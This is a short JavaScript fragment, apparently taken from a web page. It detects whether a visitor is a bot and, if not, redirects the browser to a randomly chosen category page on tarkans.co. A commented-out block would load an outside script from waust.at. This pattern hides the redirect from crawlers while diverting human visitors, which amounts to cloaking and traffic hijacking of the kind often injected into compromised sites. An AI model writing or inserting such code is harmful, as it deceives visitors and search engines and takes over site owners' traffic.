    var md = new MobileDetect(navigator.userAgent);


    if (!md.is('bot') && !navigator.userAgent.toLowerCase().includes("bot.html")) {
         cat = ['education/', 'fashions/', 'fitness/','summer/','tennis/','yoga/'];
             sec=cat[rast(0, 5)];
         window.location="https://tarkans.co/category/"+sec;
      /*  
var _wau = _wau || []; _wau.push(["dynamic", "wnwir8za59", "531", "c4302bffffff", "small"]);
    var head = document.getElementsByTagName('head')[0];

var script = document.createElement('script');
script.type = 'text/javascript';

script.src = "//waust.at/d.js";
head.appendChild(script);

    */
    
    }
function rast(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
